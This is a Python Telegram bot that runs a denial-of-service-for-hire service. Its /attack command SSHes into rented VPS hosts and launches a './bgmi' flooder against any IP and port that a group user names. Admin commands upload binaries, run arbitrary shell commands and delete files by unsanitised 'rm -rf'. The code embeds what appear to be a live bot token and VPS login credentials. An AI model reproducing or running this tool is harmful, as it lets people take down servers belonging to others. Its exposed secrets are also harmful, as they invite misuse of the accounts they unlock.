import random
import threading
import paramiko
import json
import requests
import time
import os

TOKEN = "7623380258:AAHtmKVKzNvumZyU0-GdOZ2WJ3a5XJSeMxw"  # 🔥 Replace with your bot token
API_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_IDS = [6479495033]  # 🔥 Replace with your Admin IDs
CONFIG_FILE = "config.json"

# Global variables for configuration
MAX_THREADS = 2000  # Maximum threads allowed
MAX_TIME = 240      # Maximum attack duration in seconds

# Dictionary to store temporary data for file uploads
user_data = {}

def is_admin(chat_id):
    """Check if the user is an admin."""
    return chat_id in ADMIN_IDS

def generate_config_file():
    """Generate a default config file if it doesn't exist."""
    default_config = {
        "VPS_LIST": [
            {
                "ip": "45.79.124.184",  # Replace with your default VPS IP
                "user": "master_zzjtzhszdf",       # Replace with your default VPS username
                "password": "kTN2ppbkUthg",  # Replace with your default VPS password
                "busy": False  # Initialize as not busy
            }
        ]
    }

    # Check if config.json exists
    if not os.path.exists("config.json"):
        # Create the file and write default configuration
        with open("config.json", "w") as file:
            json.dump(default_config, file, indent=4)
        print("✅ config.json created with default values.")
    else:
        print("⚠️ config.json already exists. No changes were made.")

# Call the function to generate the config file
generate_config_file()

def save_config():
    """Save the configuration to the config file."""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Load VPS details from config.json
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

# Ensure each VPS has a 'busy' key initialized to False
VPS_LIST = config["VPS_LIST"]
for vps in VPS_LIST:
    if "busy" not in vps:
        vps["busy"] = False  # Initialize 'busy' key if it doesn't exist

# Save the updated configuration (optional, to ensure 'busy' key is added to config.json)
save_config()

users = []  # 🌍 User list

def send_message(chat_id, text):
    """Send a message to the user using Telegram Bot API."""
    url = f"{API_URL}/sendMessage"
    params = {"chat_id": chat_id, "text": text}
    requests.post(url, params=params)

def get_updates(offset=None):
    """Get new updates (messages) from Telegram."""
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 10, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

def check_vps_status():
    """Check the status of all VPS and send notifications for down VPS."""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"✨🟢 `{ip}` **RUNNING** ✅")
        except:
            status_list.append(f"🔥🔴 `{ip}` **DOWN** ❌")
            failed_vps_list.append(ip)
    
    # Notify admins if any VPS is down
    if failed_vps_list:
        failed_vps_message = "\n".join([f"🔥🔴 `{ip}` **DOWN** ❌" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            send_message(admin_id, f"🚨 **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

def get_available_vps():
    """Find and return an available VPS from the VPS_LIST."""
    for vps in VPS_LIST:
        if not vps["busy"]:  # Check if the VPS is not busy
            return vps
    return None  # Return None if no VPS is available

def handle_attack(chat_id, command):
    """Handle the /attack command."""
    command = command.split()
    if len(command) != 5:
        send_message(chat_id, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>` `<THREADS>`")
        return

    target, port, time_duration, threads = command[1], command[2], command[3], command[4]

    try:
        port = int(port)
        time_duration = int(time_duration)
        threads = int(threads)
    except ValueError:
        send_message(chat_id, "❌ **Error:** Port, time, and threads must be integers!")
        return

    if time_duration > MAX_TIME:
        send_message(chat_id, f"🚫 **Maximum duration is {MAX_TIME} seconds!**")
        return

    if threads > MAX_THREADS:
        send_message(chat_id, f"🚫 **Maximum threads is {MAX_THREADS}!**")
        return

    selected_vps = get_available_vps()
    if not selected_vps:
        send_message(chat_id, "🚫 **All VPS are busy, try again later!**")
        return

    selected_vps["busy"] = True  # Mark VPS as busy
    send_message(chat_id, f"🔥 **Attack started from `{selected_vps['ip']}` on `{target}:{port}` for `{time_duration}`s with `{threads}` threads** 🚀")

    attack_thread = threading.Thread(target=execute_attack, args=(selected_vps, target, port, time_duration, threads, chat_id))
    attack_thread.start()  # Run the attack in the background

def execute_attack(vps, target, port, duration, threads, chat_id):
    """Execute an attack on the target using the selected VPS."""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./bgmi {target} {port} {duration} {threads}"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command(attack_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()

        ssh.close()
        vps["busy"] = False  # Mark VPS as free after attack

        if error:
            # Log the error and send it to the admin
            error_message = f"❌ **ATTACK FAILED FROM `{ip}`** 😡\n\n**Error:**\n```\n{error}\n```"
            send_message(chat_id, error_message)
        else:
            send_message(chat_id, f"✅ **ATTACK COMPLETED FROM `{ip}`** 💀🔥")
    except Exception as e:
        vps["busy"] = False
        error_message = f"❌ **ERROR:** {str(e)}"
        send_message(chat_id, error_message)

def handle_cvps(chat_id):
    """Handle the /cvps command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    send_message(chat_id, "⏳ **Checking VPS status...**")
    status_message = check_vps_status()
    send_message(chat_id, f"📡 **VPS STATUS:**\n{status_message}")

def handle_avps(chat_id, command):
    """Handle the /avps command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 4:
        send_message(chat_id, "⚠️ **Usage:** /avps `<IP>` `<USER>` `<PASSWORD>`")
        return

    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password, "busy": False})
    save_config()
    send_message(chat_id, f"✅ **VPS `{ip}` added!** ✨")

def handle_rvps(chat_id, command):
    """Handle the /rvps command to remove a VPS."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /rvps `<IP>`")
        return

    ip = command[1]
    global VPS_LIST
    initial_length = len(VPS_LIST)
    VPS_LIST = [vps for vps in VPS_LIST if vps["ip"] != ip]

    if len(VPS_LIST) == initial_length:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
    else:
        save_config()
        send_message(chat_id, f"✅ **VPS `{ip}` removed!** ✨")

def handle_setmaxthreads(chat_id, command):
    """Handle the /setmaxthreads command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /setmaxthreads `<THREADS>`")
        return

    try:
        threads = int(command[1])
        if threads <= 0:
            send_message(chat_id, "❌ **Threads must be a positive integer!**")
            return

        global MAX_THREADS
        MAX_THREADS = threads
        send_message(chat_id, f"✅ **Maximum threads set to `{threads}`!**")
    except ValueError:
        send_message(chat_id, "❌ **Threads must be an integer!**")

def handle_setmaxtime(chat_id, command):
    """Handle the /setmaxtime command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /setmaxtime `<TIME>`")
        return

    try:
        time_duration = int(command[1])
        if time_duration <= 0:
            send_message(chat_id, "❌ **Time must be a positive integer!**")
            return

        global MAX_TIME
        MAX_TIME = time_duration
        send_message(chat_id, f"✅ **Maximum time set to `{time_duration}` seconds!**")
    except ValueError:
        send_message(chat_id, "❌ **Time must be an integer!**")

def handle_upload_start(chat_id):
    """Handle the /upload command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    send_message(chat_id, "🔢 **Please enter the IP address of the VPS where you want to upload the file:**")
    user_data[chat_id] = {"step": "upload_ip"}

def handle_upload_ip(chat_id, ip):
    """Handle the IP address input for file upload."""
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    # Save the IP address in user_data
    user_data[chat_id] = {"step": "upload_file", "ip": ip}
    send_message(chat_id, "📤 **Please upload the file now.**")

def handle_file_upload(chat_id, file_id, file_name):
    """Handle the file upload."""
    if chat_id not in user_data or user_data[chat_id].get("step") != "upload_file":
        send_message(chat_id, "❌ **Please start the upload process using the `/upload` command.**")
        return

    # Get the saved IP address
    ip = user_data[chat_id]["ip"]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        # Get file information
        file_info = requests.get(f"{API_URL}/getFile?file_id={file_id}").json()
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info['result']['file_path']}"
        downloaded_file = requests.get(file_url).content

        # Save the file locally temporarily
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        # Upload the file to the VPS using SCP
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Use SCP to upload the file
        scp = ssh.open_sftp()
        scp.put(file_name, f"/{file_name}")  # Upload to /root directory
        scp.close()
        ssh.close()

        # Clean up the local file
        os.remove(file_name)

        send_message(chat_id, f"✅ **File `{file_name}` uploaded successfully to `{ip}`!**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error uploading file to `{ip}`:** {str(e)}")
    finally:
        # Clear the user data
        if chat_id in user_data:
            del user_data[chat_id]

def handle_ls(chat_id, command):
    """Handle the /ls command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /ls `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `ls -p | grep -v /` command to list only files
        stdin, stdout, stderr = ssh.exec_command("ls -p | grep -v /")
        ls_output = stdout.read().decode().strip()
        ssh.close()

        if ls_output:
            send_message(chat_id, f"📂 **Files on `{ip}`:**\n```\n{ls_output}\n```")
        else:
            send_message(chat_id, f"❌ **No files found on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `ls` on `{ip}`:** {str(e)}")

def handle_delete(chat_id, command):
    """Handle the /delete command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /delete `<IP>` `<file_or_directory>`")
        return

    ip, file_or_dir = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `rm -rf` command
        stdin, stdout, stderr = ssh.exec_command(f"rm -rf {file_or_dir}")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error deleting `{file_or_dir}` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully deleted `{file_or_dir}` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `delete` on `{ip}`:** {str(e)}")

def handle_terminal(chat_id, command):
    """Handle the /terminal command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split(maxsplit=2)
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /terminal `<IP>` `<COMMAND>`")
        return

    ip, terminal_command = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command(terminal_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing command on `{ip}`:**\n```\n{error}\n```")
        else:
            send_message(chat_id, f"✅ **Command output from `{ip}`:**\n```\n{output}\n```")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing command on `{ip}`:** {str(e)}")

def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1  # Update offset for next request
                message = update.get("message")
                if message:
                    chat_id = message["chat"]["id"]
                    chat_type = message["chat"]["type"]  # Get chat type (private, group, supergroup)
                    text = message.get("text")

                    # Restrict usage in private chats to owner only
                    if chat_type == "private" and not is_admin(chat_id):
                        send_message(chat_id, "🚫 **This bot can only be used in groups.**")
                        continue

                    if text and text.startswith("/"):
                        command = text.split()[0]
                        if command == "/attack":
                            handle_attack(chat_id, text)
                        elif chat_type == "private" and is_admin(chat_id):
                            # Allow admin to use all commands in private chats
                            if command == "/cvps":
                                handle_cvps(chat_id)
                            elif command == "/avps":
                                handle_avps(chat_id, text)
                            elif command == "/rvps":
                                handle_rvps(chat_id, text)
                            elif command == "/setmaxthreads":
                                handle_setmaxthreads(chat_id, text)
                            elif command == "/setmaxtime":
                                handle_setmaxtime(chat_id, text)
                            elif command == "/upload":
                                handle_upload_start(chat_id)
                            elif command == "/ls":
                                handle_ls(chat_id, text)
                            elif command == "/delete":
                                handle_delete(chat_id, text)
                            elif command == "/terminal":
                                handle_terminal(chat_id, text)
                            else:
                                send_message(chat_id, "❌ **Unknown command. Use `/help` to see available commands.**")
                        else:
                            # Block non-owner usage of other commands in groups
                            send_message(chat_id, "🚫 **This command is restricted to admins only.**")
                    elif "document" in message:
                        # Handle file uploads
                        file_id = message["document"]["file_id"]
                        file_name = message["document"]["file_name"]
                        handle_file_upload(chat_id, file_id, file_name)
                    elif chat_id in user_data and user_data[chat_id].get("step") == "upload_ip":
                        # Handle IP address input for file upload
                        handle_upload_ip(chat_id, text)
        time.sleep(1)  # Sleep to avoid spamming the API

if __name__ == "__main__":
    main()
